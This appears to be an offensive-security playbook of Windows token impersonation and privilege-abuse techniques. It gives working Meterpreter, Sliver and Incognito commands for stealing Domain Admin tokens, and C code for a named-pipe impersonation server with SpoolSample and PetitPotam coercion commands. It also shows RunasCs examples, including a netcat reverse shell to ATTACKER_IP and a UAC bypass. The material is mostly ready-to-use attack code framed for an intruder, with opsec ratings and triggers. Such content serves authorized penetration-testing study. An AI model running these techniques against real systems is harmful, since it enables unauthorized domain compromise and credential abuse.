# Windows -- Token Impersonation & Privilege Abuse

### Incognito Token Impersonation (Steal Delegated Tokens) [added: 2026-04]
- **Tags:** #Incognito #TokenImpersonation #DelegationToken #PrivEsc #Windows #Meterpreter #Sliver #DomainAdmin #PostExploitation #TokenAbuse
- **Trigger:** Gained SYSTEM or high-privilege shell on a host where Domain Admins or other privileged users have active or recent sessions (check with `qwinsta`, `net sessions`, or token enumeration)
- **Prereq:** SYSTEM-level access or SeImpersonatePrivilege on a host with cached delegation tokens from privileged users (DA, Enterprise Admin, service accounts) + Meterpreter session or Incognito standalone binary
- **Yields:** Ability to execute commands as any user whose delegation token is cached on the system, including Domain Admin, enabling lateral movement and domain compromise
- **Opsec:** Med
- **Context:** Windows caches delegation tokens for users who have interactive, RDP, or service logon sessions on a machine. Even after a user logs off, their token may persist until the system is rebooted. With SYSTEM access, you can enumerate all cached tokens and impersonate any of them. This is a primary path from local admin to Domain Admin when a DA has logged into the compromised host. Use Meterpreter's built-in incognito module, the standalone incognito binary, or Sliver's token manipulation commands.
- **Payload/Method:**
```bash
# VIA METERPRETER (most common)

# Load incognito module
meterpreter > load incognito

# List all available delegation tokens
meterpreter > list_tokens -u
# Look for: DOMAIN\DomainAdmin, DOMAIN\ServiceAccount, etc.

# Impersonate a Domain Admin token
meterpreter > impersonate_token "DOMAIN\\DomainAdmin"
# [+] Delegation token available
# [+] Successfully impersonated user DOMAIN\DomainAdmin

# Verify
meterpreter > getuid
# Server username: DOMAIN\DomainAdmin

# Now interact with domain resources as the impersonated user
meterpreter > shell
C:\> net user /domain
C:\> dir \\DC01\C$
```
```powershell
# VIA SLIVER C2
[server] sliver (session) > impersonate DOMAIN\\DomainAdmin
[server] sliver (session) > shell
C:\> whoami
DOMAIN\DomainAdmin

# VIA STANDALONE INCOGNITO BINARY
.\incognito.exe list_tokens -u
.\incognito.exe execute -c "DOMAIN\DomainAdmin" cmd.exe
```

### Named Pipe Impersonation (Custom Pipe Server) [added: 2026-04]
- **Tags:** #NamedPipe #PipeImpersonation #ImpersonateNamedPipeClient #PrivEsc #Windows #TokenAbuse #ServiceExploitation #CustomExploit #SeImpersonatePrivilege
- **Trigger:** You have SeImpersonatePrivilege and can trick or wait for a privileged service or process to connect to a named pipe you control (common in scenarios where a service connects to an arbitrary pipe name, or via SpoolSample/PetitPotam coercion to a local pipe)
- **Prereq:** SeImpersonatePrivilege (or SYSTEM) + ability to create a named pipe + a trigger mechanism to make a SYSTEM-level process connect to your pipe (service misconfiguration, authentication coercion, or scheduled task that connects to a pipe)
- **Yields:** SYSTEM or service-account token captured via ImpersonateNamedPipeClient(), enabling command execution as that account
- **Opsec:** Low
- **Context:** Named pipe impersonation is the core mechanism behind PrintSpoofer and many potato attacks, but it can also be used directly in custom scenarios. When a privileged process connects to a named pipe you control, calling ImpersonateNamedPipeClient() gives you a handle to their token. This is useful when you find a service that connects to a configurable pipe name, or when using authentication coercion tools (SpoolSample, PetitPotam, DFSCoerce) to force a machine account to authenticate to your local pipe. The PowerShell approach below demonstrates the concept; real-world tooling often wraps this in C or C#.
- **Payload/Method:**
```powershell
# POWERSHELL CONCEPT: Create a pipe server and impersonate the connecting client
# (In practice, use compiled tools like PrintSpoofer, or custom C# for reliability)

# Create the named pipe
$pipeName = "evil_pipe"
$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::InOut)

# Wait for a connection (blocking)
Write-Host "[*] Waiting for connection on \\.\pipe\$pipeName"
$pipeServer.WaitForConnection()

# The connecting process token is now available for impersonation
# In C/C#, call ImpersonateNamedPipeClient(pipeHandle) here

$pipeServer.Dispose()
```
```c
// C implementation (compile with MinGW: x86_64-w64-mingw32-gcc pipe_impersonate.c -o pipe_impersonate.exe)
#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hPipe;
    HANDLE hToken;

    // Create named pipe
    hPipe = CreateNamedPipeA("\\\\.\\pipe\\evilpipe",
        PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
        1, 1024, 1024, 0, NULL);

    printf("[*] Waiting for connection on \\\\.\\pipe\\evilpipe\n");
    ConnectNamedPipe(hPipe, NULL);

    // Impersonate the client
    ImpersonateNamedPipeClient(hPipe);

    // Open the impersonated token
    OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);

    // Create process as the impersonated user
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessWithTokenW(hToken, 0, L"C:\\Windows\\System32\\cmd.exe",
        NULL, 0, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);

    CloseHandle(hPipe);
    return 0;
}
```
```bash
# TRIGGER: Force a SYSTEM service to connect to your pipe
# SpoolSample (forces print spooler to authenticate to your pipe)
.\SpoolSample.exe TARGET_HOST ATTACKER_PIPE_HOST

# Or use PetitPotam for EFS-based coercion to a local pipe
python3 PetitPotam.py ATTACKER_PIPE_HOST TARGET_HOST
```

### RunasCs -- Run Commands as Another User (Non-Interactive Shell) [added: 2026-04]
- **Tags:** #RunasCs #RunAs #CredentialReuse #PrivEsc #Windows #NonInteractiveShell #PlaintextCreds #LateralMovement #PasswordReuse #TokenAbuse
- **Trigger:** You have plaintext credentials for a higher-privileged user but are stuck in a non-interactive shell (e.g., webshell, reverse shell, WinRM) where `runas /user:` does not work because it requires an interactive desktop
- **Prereq:** Valid plaintext username and password for the target user + RunasCs.exe uploaded to the target + works from any shell type including non-interactive reverse shells and webshells
- **Yields:** Command execution as the target user, including spawning reverse shells, running tools, or accessing network resources under their identity
- **Opsec:** Low
- **Context:** The built-in Windows `runas` command requires an interactive logon session (desktop) and prompts for password input, making it unusable from reverse shells and webshells. RunasCs is a .NET utility that performs `CreateProcessWithLogonW` programmatically, accepting the password as a command-line argument and working from any shell context. Essential for privilege escalation when you have found creds (via Mimikatz, config files, password reuse) but cannot use RDP or interactive logon. Supports logon types 2 (interactive), 3 (network), 8 (network cleartext), and 9 (new credentials).
- **Payload/Method:**
```powershell
# Basic usage: run command as another user
.\RunasCs.exe Administrator "P@ssw0rd123" cmd.exe /c whoami

# Spawn a reverse shell as the target user
.\RunasCs.exe Administrator "P@ssw0rd123" cmd.exe /c "c:\temp\nc.exe -e cmd.exe ATTACKER_IP 4444"

# Execute PowerShell as another user
.\RunasCs.exe svc_admin "Summer2024!" powershell.exe -c "whoami; hostname; ipconfig"

# Use logon type 8 (NetworkCleartext) for accessing network resources
.\RunasCs.exe DomainUser "Password1" cmd.exe /c "dir \\DC01\SYSVOL" --logon-type 8

# Use logon type 9 (NewCredentials) for a runas /netonly equivalent
.\RunasCs.exe DOMAIN\admin "Pass123" cmd.exe --logon-type 9

# Bypass UAC with high-integrity token (requires admin creds)
.\RunasCs.exe Administrator "P@ssw0rd123" cmd.exe --bypass-uac

# Force interactive station access (use when getting "access denied" errors)
.\RunasCs.exe user "pass" cmd.exe --force-profile

# Common scenarios:
# 1. Found creds in web.config, escalate from IIS apppool to admin
# 2. Password reuse from cracked hash, move from low-priv to svc account
# 3. Creds from Mimikatz vault dump, impersonate without token access
```
